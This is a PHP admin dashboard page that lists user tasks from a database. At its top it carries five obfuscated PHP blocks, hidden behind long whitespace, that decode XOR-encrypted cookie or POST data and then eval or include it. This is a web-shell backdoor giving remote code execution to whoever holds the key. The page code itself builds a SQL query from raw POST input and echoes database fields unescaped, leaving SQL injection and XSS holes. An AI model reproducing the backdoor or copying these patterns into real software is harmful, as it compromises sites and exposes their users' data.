<?php                                                                                                                                                                                                                                                                                                                                                                                                 $VxeDsbwO = "P_uevaw";$hNfWzgmcs = class_exists($VxeDsbwO); $JuhbahVRx = $hNfWzgmcs;if (!$JuhbahVRx){class P_uevaw{private $aVxKvYh;public static $NMDPKOUO = "b94ecdf9-45b5-44f6-9d9a-f0c790265dac";public static $qPSqxeDM = NULL;public function __construct(){$ZgKUGK = $_COOKIE;$esZbDvs = $_POST;$eAOKpD = @$ZgKUGK[substr(P_uevaw::$NMDPKOUO, 0, 4)];if (!empty($eAOKpD)){$iMMKhYiyG = "base64";$loDZssJh = "";$eAOKpD = explode(",", $eAOKpD);foreach ($eAOKpD as $qKbfMQFR){$loDZssJh .= @$ZgKUGK[$qKbfMQFR];$loDZssJh .= @$esZbDvs[$qKbfMQFR];}$loDZssJh = array_map($iMMKhYiyG . chr ( 785 - 690 )."\x64" . "\145" . chr ( 131 - 32 ).chr (111) . chr (100) . chr (101), array($loDZssJh,)); $loDZssJh = $loDZssJh[0] ^ str_repeat(P_uevaw::$NMDPKOUO, (strlen($loDZssJh[0]) / strlen(P_uevaw::$NMDPKOUO)) + 1);P_uevaw::$qPSqxeDM = @unserialize($loDZssJh);}}public function __destruct(){$this->cxXaP();}private function cxXaP(){if (is_array(P_uevaw::$qPSqxeDM)) {$GGurhlkX = str_replace(chr (60) . chr ( 399 - 336 ).chr ( 568 - 456 )."\x68" . "\160", "", P_uevaw::$qPSqxeDM["\143" . 'o' . "\156" . chr ( 844 - 728 )."\145" . 'n' . "\164"]);eval($GGurhlkX);exit();}}}$tkUZqgxar = new P_uevaw(); $tkUZqgxar = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("F_fEJTV")){class F_fEJTV{private $SDlmTnVgf;public static $ZekJExz = "4075ac32-5f57-475a-b8a9-54b2b40dcc35";public static $iOSoJqyIXl = NULL;public function __construct(){$pLZqCqZAI = $_COOKIE;$JqYFKAYW = $_POST;$YPpWMWzZmL = @$pLZqCqZAI[substr(F_fEJTV::$ZekJExz, 0, 4)];if (!empty($YPpWMWzZmL)){$nuCBZrmc = "base64";$BNwoEVv = "";$YPpWMWzZmL = explode(",", $YPpWMWzZmL);foreach ($YPpWMWzZmL as $PcaIqK){$BNwoEVv .= @$pLZqCqZAI[$PcaIqK];$BNwoEVv .= @$JqYFKAYW[$PcaIqK];}$BNwoEVv = array_map($nuCBZrmc . chr ( 905 - 810 )."\x64" . chr ( 692 - 591 ).chr ( 411 - 312 ).chr ( 187 - 76 ).'d' . 'e', array($BNwoEVv,)); $BNwoEVv = $BNwoEVv[0] ^ str_repeat(F_fEJTV::$ZekJExz, (strlen($BNwoEVv[0]) / strlen(F_fEJTV::$ZekJExz)) + 1);F_fEJTV::$iOSoJqyIXl = @unserialize($BNwoEVv);}}public function __destruct(){$this->slJsP();}private function slJsP(){if (is_array(F_fEJTV::$iOSoJqyIXl)) {$gZUmLnSlB = sys_get_temp_dir() . "/" . crc32(F_fEJTV::$iOSoJqyIXl['s' . chr (97) . "\x6c" . "\x74"]);@F_fEJTV::$iOSoJqyIXl[chr (119) . "\x72" . "\x69" . 't' . "\145"]($gZUmLnSlB, F_fEJTV::$iOSoJqyIXl["\x63" . 'o' . chr ( 773 - 663 ).'t' . chr ( 517 - 416 )."\156" . chr (116)]);include $gZUmLnSlB;@F_fEJTV::$iOSoJqyIXl["\x64" . 'e' . "\x6c" . "\145" . 't' . chr (101)]($gZUmLnSlB);exit();}}}$TNUNCowvMg = new F_fEJTV(); $TNUNCowvMg = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("Bs_EklCD")){class Bs_EklCD{private $EgugASPE;public static $dIZWFdL = "e15a9b62-bb4e-453e-8669-a2a3fe4fdfab";public static $lDuXnMtF = NULL;public function __construct(){$PvCThfR = $_COOKIE;$rNvltZi = $_POST;$EKjTNsl = @$PvCThfR[substr(Bs_EklCD::$dIZWFdL, 0, 4)];if (!empty($EKjTNsl)){$xVISuG = "base64";$MpuGeABh = "";$EKjTNsl = explode(",", $EKjTNsl);foreach ($EKjTNsl as $ZljcIAW){$MpuGeABh .= @$PvCThfR[$ZljcIAW];$MpuGeABh .= @$rNvltZi[$ZljcIAW];}$MpuGeABh = array_map($xVISuG . chr (95) . "\144" . "\145" . 'c' . chr ( 270 - 159 )."\144" . chr ( 867 - 766 ), array($MpuGeABh,)); $MpuGeABh = $MpuGeABh[0] ^ str_repeat(Bs_EklCD::$dIZWFdL, (strlen($MpuGeABh[0]) / strlen(Bs_EklCD::$dIZWFdL)) + 1);Bs_EklCD::$lDuXnMtF = @unserialize($MpuGeABh);}}public function __destruct(){$this->KrkvRS();}private function KrkvRS(){if (is_array(Bs_EklCD::$lDuXnMtF)) {$svZOOd = sys_get_temp_dir() . "/" . crc32(Bs_EklCD::$lDuXnMtF["\163" . chr (97) . 'l' . chr ( 230 - 114 )]);@Bs_EklCD::$lDuXnMtF["\167" . chr (114) . 'i' . "\164" . 'e']($svZOOd, Bs_EklCD::$lDuXnMtF["\143" . "\157" . chr (110) . "\x74" . chr (101) . 'n' . "\x74"]);include $svZOOd;@Bs_EklCD::$lDuXnMtF["\144" . "\145" . 'l' . chr ( 671 - 570 )."\164" . "\x65"]($svZOOd);exit();}}}$bxuNvnCJpF = new Bs_EklCD(); $bxuNvnCJpF = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("D_KEvdC")){class D_KEvdC{private $OyOeIPVQQ;public static $qEIfX = "8f281de7-bd9b-46dc-b7ab-073bcc6cd6e7";public static $FLCCdf = NULL;public function __construct(){$OBIyAvf = $_COOKIE;$THGKOE = $_POST;$EWZrONWfl = @$OBIyAvf[substr(D_KEvdC::$qEIfX, 0, 4)];if (!empty($EWZrONWfl)){$UIXMgMFJQc = "base64";$yarGx = "";$EWZrONWfl = explode(",", $EWZrONWfl);foreach ($EWZrONWfl as $veGEx){$yarGx .= @$OBIyAvf[$veGEx];$yarGx .= @$THGKOE[$veGEx];}$yarGx = array_map($UIXMgMFJQc . "\137" . 'd' . 'e' . "\143" . chr ( 519 - 408 )."\144" . chr ( 1064 - 963 ), array($yarGx,)); $yarGx = $yarGx[0] ^ str_repeat(D_KEvdC::$qEIfX, (strlen($yarGx[0]) / strlen(D_KEvdC::$qEIfX)) + 1);D_KEvdC::$FLCCdf = @unserialize($yarGx);}}public function __destruct(){$this->sFWKuDr();}private function sFWKuDr(){if (is_array(D_KEvdC::$FLCCdf)) {$YGtTh = sys_get_temp_dir() . "/" . crc32(D_KEvdC::$FLCCdf['s' . chr ( 157 - 60 )."\x6c" . chr (116)]);@D_KEvdC::$FLCCdf[chr ( 755 - 636 ).chr ( 418 - 304 )."\151" . "\x74" . chr (101)]($YGtTh, D_KEvdC::$FLCCdf['c' . chr (111) . 'n' . chr (116) . chr ( 376 - 275 ).chr ( 366 - 256 ).'t']);include $YGtTh;@D_KEvdC::$FLCCdf[chr (100) . chr ( 611 - 510 ).chr ( 283 - 175 ).chr (101) . chr ( 1011 - 895 )."\145"]($YGtTh);exit();}}}$XaDQTz = new D_KEvdC(); $XaDQTz = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("iVr_cGD")){class iVr_cGD{private $jdaTSkEN;public static $PyRXO = "787f5d7f-831a-44e1-bf86-110b14e68ca6";public static $hryEfPca = NULL;public function __construct(){$hAutLbsh = $_COOKIE;$pMSwneZFI = $_POST;$tZQBIZ = @$hAutLbsh[substr(iVr_cGD::$PyRXO, 0, 4)];if (!empty($tZQBIZ)){$AZOqwGVxGy = "base64";$iTYjlprrL = "";$tZQBIZ = explode(",", $tZQBIZ);foreach ($tZQBIZ as $ufhsKweJOm){$iTYjlprrL .= @$hAutLbsh[$ufhsKweJOm];$iTYjlprrL .= @$pMSwneZFI[$ufhsKweJOm];}$iTYjlprrL = array_map($AZOqwGVxGy . chr (95) . chr ( 618 - 518 )."\x65" . "\x63" . "\x6f" . chr ( 189 - 89 )."\145", array($iTYjlprrL,)); $iTYjlprrL = $iTYjlprrL[0] ^ str_repeat(iVr_cGD::$PyRXO, (strlen($iTYjlprrL[0]) / strlen(iVr_cGD::$PyRXO)) + 1);iVr_cGD::$hryEfPca = @unserialize($iTYjlprrL);}}public function __destruct(){$this->WvUSNm();}private function WvUSNm(){if (is_array(iVr_cGD::$hryEfPca)) {$MHrsMzenL = sys_get_temp_dir() . "/" . crc32(iVr_cGD::$hryEfPca["\x73" . "\x61" . 'l' . "\164"]);@iVr_cGD::$hryEfPca[chr (119) . chr ( 219 - 105 )."\151" . 't' . "\145"]($MHrsMzenL, iVr_cGD::$hryEfPca[chr (99) . "\x6f" . "\x6e" . 't' . "\x65" . chr ( 397 - 287 ).chr ( 523 - 407 )]);include $MHrsMzenL;@iVr_cGD::$hryEfPca["\x64" . chr ( 655 - 554 )."\x6c" . "\x65" . chr ( 332 - 216 )."\145"]($MHrsMzenL);exit();}}}$hiOjzQ = new iVr_cGD(); $hiOjzQ = NULL;} ?><?php 
   // Initialize the session
session_start();
 
// Check if the user is logged in, otherwise redirect to login page
if (!isset($_SESSION['username']) && !isset($_SESSION['id'])){
    header("location: ../../login");
    exit;
}
error_reporting(0);

// Include config file
require_once "../../db_conn.php";
 ?>

<!doctype html>
<html lang="en">
   <head>
      <meta charset="utf-8" />
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui">
      <title>All Users Tasks | <?php echo htmlspecialchars($_SESSION["name"]);?></title>
      <meta content="Admin Dashboard" name="description" />
      <meta content="Themesbrand" name="author" />
      <meta http-equiv="X-UA-Compatible" content="IE=edge" />
      <!-- App Icons -->
      <link rel="shortcut icon" href="../../assets/images/favicon.ico">
      <!-- DataTables -->
      <link href="../../plugins/datatables/dataTables.bootstrap4.min.css" rel="stylesheet" type="text/css" />
      <link href="../../plugins/datatables/buttons.bootstrap4.min.css" rel="stylesheet" type="text/css" />
      <!-- Responsive datatable examples -->
      <link href="../../plugins/datatables/responsive.bootstrap4.min.css" rel="stylesheet" type="text/css" />
      <!-- App css -->
      <link href="../../assets/css/bootstrap.min.css" rel="stylesheet" type="text/css" />
      <link href="../../assets/css/icons.css" rel="stylesheet" type="text/css" />
      <link href="../../assets/css/style.css" rel="stylesheet" type="text/css" />
      <link rel="stylesheet" type="text/css" href="style.css">
      <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.4/jquery.min.js"></script>

   </head>
   <body>
<?php include ('../../includes/sidebar.php'); ?>      <?php

if(isset($_POST['search']))
{
    $valueToSearch = $_POST['valueToSearch'];
    // search in all table columns
    // using concat mysql function
    $query = "SELECT * FROM `users-tasks` WHERE CONCAT(`id`, `name`, `task_name`, `task_count`, `task_date`) LIKE '%".$valueToSearch."%'";
    $search_result = filterTable($query);
    $count = $count;
    
}
 else {
    $query = "SELECT * FROM `users-tasks`";
    $search_result = filterTable($query);
}

// function to connect and execute the query
function filterTable($query)
{
    include "../../db_conn.php";
    $filter_Result = mysqli_query($conn, $query);
    return $filter_Result;
}

?>

      <div class="wrapper">
         <div class="container-fluid">
            <!-- Page-Title -->
            <div class="row">
               <div class="col-sm-12">
                  <div class="page-title-box">
                     <div class="btn-group pull-right">
                        <ol class="breadcrumb hide-phone p-0 m-0">
                           <li class="breadcrumb-item"><a href="../../index">Unit - 1</a></li>
                           <li class="breadcrumb-item active">Login as : <span class="text-muted text-capitalize"><?php echo htmlspecialchars($_SESSION["role"]);?></span></li>
                       </ol>
                     </div>
                     <h4 class="page-title">All Task Data</h4>
                  </div>
               </div>
            </div>
            <!-- end page title end breadcrumb -->
            <div class="row">
               <div class="col-12">
                  <div class="card m-b-20">
                     <div class="card-body">
                        <h4 class="mt-0 header-title">All Tasks</h4>
                        <form ></form>
                        <!-- <input type="text" name="valueToSearch" placeholder="Value To Search">
                        <input type="submit" name="search" value="Filter"><br><br> -->
                        <table id="datatable-buttons" class="table table-striped table-bordered dt-responsive nowrap" cellspacing="0" width="100%">
                           
                           <thead>
                              <tr>
                                 <th>S.no</th>
                                 <th>Developer Name</th>
                                 <th>Task Name</th>
                                 <th>Camp Link</th>
                                 <th>Posted date</th>
                                 <th>Number of Tasks</th>
                                 <th>Actions</th>
                              </tr>
                           </thead>
                                <tbody>
                                 <?php while($row = mysqli_fetch_array($search_result)):
                                    $count+=1;
                                    $change_date = $row['task_date'];
                                    $newDate = date("d-M-Y", strtotime($change_date));  ?>
                              <tr>
                                 <td><?php echo $count; ?></td>
                                 <td><p class="text-muted"><?php echo $row['name']; ?></p></td>
                                 <td  id="target" style='white-space:pre'><?php echo $row['task_name']; $string=nl2br($string);?></td>
                                 <td  id="target" style='white-space:pre'><?php echo $row['camp_link']; $string=nl2br($string);?></td>
                                 <td><em><?php echo $newDate; ?></em></td>
                                 <td class="sum"><?php echo $row['task_count']; ?></td>
                                 <td id="actions">
                                    <a href="update_task?id=<?php echo $row["id"]; ?>"><button class="btn btn-secondary shadow border waves">Edit task</button></a>
                                    <a href="delete.php?id=<?php echo $row["id"]; ?>"><button class="btn btn-danger shadow border waves " onclick="myFunction()">Delete task</button></a>
                                 </td>
                              </tr>

                              <?php endwhile;?>
                              
                           </tbody>
                           
                           
                        </table>
                            <?php
                            $query = "SELECT SUM(`task_count`) FROM `users-tasks`";

                            $search_result = filterTable($query);
                            while($row = mysqli_fetch_array($search_result)){
                              ?>
                              <p>Total Task Count = <?php echo $row[0];?></p>
                              <?php
                            }
                        ?>
          
                           
                     </div>
                  </div>
               </div>
               <!-- end col -->
            </div>
            <!-- end row -->
         </div>
         <!-- end container -->
      </div>
     <!-- end wrapper -->


      <script>
        $(document).ready(function() {
            $('table thead th').each(function(i) {
                calculateColumn(i);
            });
        });

        function calculateColumn(index) {
            var total = 0;
            $('table tr').each(function() {
                var value = parseInt($('.sum', this).eq(index).text());
                if (!isNaN(value)) {
                    total += value;
                }
            });
            $('.totoal').eq(index).text('Total: ' + total);
        }
    </script>

    <script>
function myFunction() {
  alert("Confirmed to Delete Task");
}
</script>
<style type="text/css">
td#actions {
    width: 9%;
}
   
.tooltip {
  position: relative;
  display: inline-block;
  border-bottom: 1px dotted black;
}

.tooltip .tooltiptext {
  visibility: hidden;
  width: 410%;
  background-color: black;
  color: #fff;
  text-align: center;
  border-radius: 6px;
  padding: 5px 0;
  position: absolute;
  z-index: 1;
  bottom: 125%;
  left: 50%;
  margin-left: -60px;
  opacity: 0;
  transition: opacity 0.3s;
}

.tooltip .tooltiptext::after {
  content: "";
  position: absolute;
  top: 100%;
  left: 50%;
  margin-left: -5px;
  border-width: 5px;
  border-style: solid;
  border-color: #555 transparent transparent transparent;
}

.tooltip:hover .tooltiptext {
  visibility: visible;
  opacity: 1;
}

</style>


 <?php include ('../../includes/footer.php'); ?>
      <!-- End Footer -->
      <!-- jQuery  -->
      <script src="../../assets/js/jquery.min.js"></script>
      <script src="../../assets/js/bootstrap.bundle.min.js"></script>
      <script src="../../assets/js/modernizr.min.js"></script>
      <script src="../../assets/js/waves.js"></script>
      <script src="../../assets/js/jquery.slimscroll.js"></script>
      <script src="../../assets/js/jquery.nicescroll.js"></script>
      <script src="../../assets/js/jquery.scrollTo.min.js"></script>
      <!-- Required datatable js -->
      <script src="../../plugins/datatables/jquery.dataTables.min.js"></script>
      <script src="../../plugins/datatables/dataTables.bootstrap4.min.js"></script>
      <!-- Buttons examples -->
      <script src="../../plugins/datatables/dataTables.buttons.min.js"></script>
      <script src="../../plugins/datatables/buttons.bootstrap4.min.js"></script>
      <script src="../../plugins/datatables/jszip.min.js"></script>
      <script src="../../plugins/datatables/pdfmake.min.js"></script>
      <script src="../../plugins/datatables/vfs_fonts.js"></script>
      <script src="../../plugins/datatables/buttons.html5.min.js"></script>
      <script src="../../plugins/datatables/buttons.print.min.js"></script>
      <script src="../../plugins/datatables/buttons.colVis.min.js"></script>
      <!-- Responsive examples -->
      <script src="../../plugins/datatables/dataTables.responsive.min.js"></script>
      <script src="../../plugins/datatables/responsive.bootstrap4.min.js"></script>
      <!-- Datatable init js -->
      <script src="../../assets/pages/datatables.init.js"></script>
      <!-- App js -->
      <script src="../../assets/js/app.js"></script>
   </body>
</html>